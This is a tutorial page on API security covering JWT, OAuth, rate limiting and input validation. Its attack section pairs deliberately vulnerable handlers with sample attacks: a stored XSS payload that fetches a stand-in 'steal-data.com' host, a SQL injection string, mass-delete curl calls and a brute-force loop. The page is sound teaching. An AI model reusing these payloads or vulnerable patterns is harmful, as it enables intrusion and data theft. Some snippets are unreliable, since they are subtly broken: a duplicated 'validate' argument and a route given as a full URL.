# Week 13: API Security

## Real Talk

If your API isn't secure, nothing else matters. An insecure API is worse than no API.

This week covers:

- How APIs get attacked
- How to prevent attacks
- Standard authentication patterns
- Token-based security
- Best practices the industry actually uses

## Authentication vs Authorization

**Authentication**: Who are you?

- Proving your identity
- "I'm John with password XYZ"
- Login form that checks username/password
- API key that proves you're an authorized app

**Authorization**: What are you allowed to do?

- Once we know who you are, what can you access?
- "You're authenticated, but you can't delete other users' data"
- "You're admin, you can do anything"
- "You're a free tier user, limited to 100 requests/day"

Both matter. Authentication without authorization = bad. Authorization assumes authentication worked.

## How APIs Get Attacked

### 1. No Authentication

```javascript
// BAD - Anyone can call this
app.delete("/users/:id", (req, res) => {
  User.destroy(req.params.id);
  res.json({ deleted: true });
});

// Attack: curl https://myapi.com/users/1
//         curl https://myapi.com/users/2
//         curl https://myapi.com/users/3
// Result: All users deleted!
```

### 2. Weak Authentication

```python
# BAD - Password in URL
@app.route('/ data', methods=['GET'])
def get_data():
    password = request.args.get('password')
    if password == 'secret123':
        return json.dumps(get_all_data())
    return "Unauthorized"

# Attack: Browser history, logs, SSL interception all see "secret123"
# Or: Brute force with common passwords
```

### 3. Stored XSS on Admin Page

```javascript
// API returns user comment without sanitizing
app.get("/posts/:id", (req, res) => {
  const post = db.get(req.params.id);
  res.json(post); // comment might have JavaScript!
});

// Admin loads post with: comment: "<img src=X onerror='fetch("steal-data.com")'/>"
// Admin's browser executes the attack script!
```

### 4. SQL Injection

```python
# BAD - String concatenation
user_id = request.args.get('id')
query = f"SELECT * FROM users WHERE id = {user_id}"
db.execute(query)

# Attack: ?id=1 OR 1=1
# Becomes: SELECT * FROM users WHERE id = 1 OR 1=1
# Returns all users, not just one!
```

### 5. No Rate Limiting

```javascript
// Attacker floods the API
while (true) {
  fetch("https://myapi.com/login", {
    method: "POST",
    body: JSON.stringify({ username: "admin", password: "guess1" }),
  });
  // Try 10,000 passwords per second
  // Server collapses from load
}
```

## Proper Authentication with JWT

### JWT (JSON Web Tokens) - The Modern Standard

JWT is a self-contained token you send with each request:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VySWQiOjQyLCJuYW1lIjoiSm9obiIsImlhdCI6MTcwNDEwMDAwMH0.
signature_here
```

Three parts separated by dots:

1. **Header** (base64): `{"alg": "HS256", "typ": "JWT"}`
2. **Payload** (base64): `{"userId": 42, "name": "John", "iat": 1704100000}`
3. **Signature**: HMAC of header+payload with server's secret

### Creating JWT (Server)

```python
import jwt
from datetime import datetime, timedelta

SECRET_KEY = 'super-secret-key'

def create_token(user_id, username):
    payload = {
        'userId': user_id,
        'username': username,
        'iat': datetime.utcnow(),
        'exp': datetime.utcnow() + timedelta(hours=24)  # Expires in 24 hours
    }
    token = jwt.encode(payload, SECRET_KEY, algorithm='HS256')
    return token

# After login verification
user = verify_credentials(username, password)
if user:
    token = create_token(user['id'], user['username'])
    return { 'success': True, 'token': token }
```

### Using JWT (Client)

```javascript
// After login, store the token
const response = await fetch("https://api.example.com/login", {
  method: "POST",
  body: JSON.stringify({ username: "john", password: "mypassword" }),
});
const { token } = await response.json();
localStorage.setItem("token", token);

// Send token with each request
const data = await fetch("https://api.example.com/users/me", {
  headers: {
    Authorization: `Bearer ${token}`,
  },
});
```

### Verifying JWT (Server)

```python
def verify_token(token):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
        return payload
    except jwt.ExpiredSignatureError:
        return None  # Token expired
    except jwt.InvalidTokenError:
        return None  # Invalid signature

@app.route('/users/me', methods=['GET'])
def get_current_user():
    auth_header = request.headers.get('Authorization')
    if not auth_header:
        return {'error': 'Missing token'}, 401

    token = auth_header.replace('Bearer ', '')
    payload = verify_token(token)

    if not payload:
        return {'error': 'Invalid token'}, 401

    user = User.get(payload['userId'])
    return user.to_json()
```

## OAuth 2.0 - The Authorization Standard

OAuth is for when you want users to log in with Google/Facebook/GitHub instead of creating a new password.

### OAuth Flow (Simplified)

```
1. User visits your app
2. App redirects to Google: "User wants to sign in"
3. Google login page appears
4. User enters Google credentials
5. Google asks: "Allow MyApp to access your email?"
6. User clicks yes
7. Google redirects back to your app with an authorization code
8. Your backend exchanges code for an access token
9. You get user's email from Google
10. User is logged in to your app
```

Your app never sees the user's Google password. Secure!

### OAuth Authorization Code Flow (Code)

```python
import requests
from flask import Flask, redirect, request, session

GOOGLE_CLIENT_ID = 'your-client-id.apps.googleusercontent.com'
GOOGLE_CLIENT_SECRET = 'your-client-secret'

@app.route('/login')
def login():
    # Redirect to Google
    google_auth_url = 'https://accounts.google.com/o/oauth2/auth'
    params = {
        'client_id': GOOGLE_CLIENT_ID,
        'redirect_uri': 'https://myapp.com/callback',
        'scope': 'email profile',
        'response_type': 'code'
    }
    return redirect(f'{google_auth_url}?{urlencode(params)}')

@app.route('/callback')
def callback():
    # Google redirects here with authorization code
    code = request.args.get('code')

    # Exchange code for access token (backend to backend, secure)
    token_url = 'https://oauth2.googleapis.com/token'
    data = {
        'client_id': GOOGLE_CLIENT_ID,
        'client_secret': GOOGLE_CLIENT_SECRET,
        'code': code,
        'redirect_uri': 'https://myapp.com/callback',
        'grant_type': 'authorization_code'
    }

    response = requests.post(token_url, data=data)
    access_token = response.json()['access_token']

    # Get user info
    user_info_url = 'https://www.googleapis.com/oauth2/v2/userinfo'
    user_response = requests.get(user_info_url, headers={'Authorization': f'Bearer {access_token}'})
    user_data = user_response.json()

    # Log user in
    session['user_id'] = user_data['id']
    return redirect('/')
```

## Rate Limiting - Prevent Abuse

Limit how many times someone can call your API:

```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/login', methods=['POST'])
@limiter.limit('5 per minute')  # Max 5 login attempts per minute per IP
def login():
    username = request.json['username']
    password = request.json['password']
    # ... verify credentials
    return { 'token': create_token(...) }

@app.route('/data', methods=['GET'])
@limiter.limit('1000 per day')  # Max 1000 requests per day per user
def get_data():
    return data.to_json()
```

## Input Validation - Prevent Injection Attacks

Always validate and sanitize user input:

```python
from marshmallow import Schema, fields, validate

class UserSchema(Schema):
    username = fields.Str(
        required=True,
        validate=validate.Length(min=3, max=50),
        validate=validate.Regexp(r'^[a-zA-Z0-9_]+$')  # Only alphanumeric
    )
    email = fields.Email(required=True)  # Must be valid email
    age = fields.Int(
        required=False,
        validate=validate.Range(min=0, max=150)
    )

@app.route('/users', methods=['POST'])
def create_user():
    schema = UserSchema()
    try:
        data = schema.load(request.json)  # Validates and cleans
    except ValidationError as err:
        return { 'errors': err.messages }, 400

    user = User.create(**data)
    return user.to_json()
```

## Security Headers - Protect Against Browser Attacks

```python
@app.after_request
def set_security_headers(response):
    # Prevent clickjacking
    response.headers['X-Frame-Options'] = 'DENY'

    # Prevent MIME sniffing
    response.headers['X-Content-Type-Options'] = 'nosniff'

    # Enable browser XSS protection
    response.headers['X-XSS-Protection'] = '1; mode=block'

    # Strict Transport Security (force HTTPS)
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'

    # Disable caching for sensitive data
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate'

    return response
```

## HTTPS - Always

```
❌ WRONG: http://myapi.com
✓ RIGHT: https://myapi.com
```

HTTP sends data in plain text. Anyone on the network can read it (passwords, tokens, etc.). HTTPS encrypts everything.

## API Security Checklist

- ✓ HTTPS only (no HTTP)
- ✓ Authenticate every request (JWT or OAuth)
- ✓ Validate all inputs
- ✓ Rate limit endpoints
- ✓ Set security headers
- ✓ Log access attempts
- ✓ Keep secrets secure (don't commit to git!)
- ✓ Use strong encryption for passwords (bcrypt, not MD5)
- ✓ Implement CORS properly (don't allow all origins)
- ✓ Regular security audits
- ✓ Keep dependencies updated
- ✓ Use parameterized queries (not string concatenation)
- ✓ Don't expose error details (don't leak DB errors to users)

## Common Mistakes

**WRONG:**

```python
# Storing password as plain text
user.password = 'mypassword'

# Using SHA1 for password (too fast to crack)
user.password = hashlib.sha1('mypassword').hexdigest()

# Putting secrets in code
API_KEY = 'sk-1234567890'

# Trusting user ID from request
user_id = request.args.get('user_id')  # What if I pass 42 but I'm user 1?

# No HTTPS
@app.route('https://admin.com/tokens', ...)  # Even admin page should be HTTPS!
```

**RIGHT:**

````python
# Using bcrypt (designed for passwords, slow to crack)
import bcrypt
hashed = bcrypt.hashpw(b'mypassword', bcrypt.gensalt())
bcrypt.checkpw(b'mypassword_attempt', hashed)  # True/False

# Storing secrets in environment variables
API_KEY = os.environ['STRIPE_API_KEY']

# Using authenticated user from verified token
user_id = current_user['id']  # From verified JWT

# Always HTTPS
# Your hosting should enforce it
```"

---

**Previous:** [Week 12 - gRPC](../week12_grpc/)
**Final:** Complete the course! 🎓
```
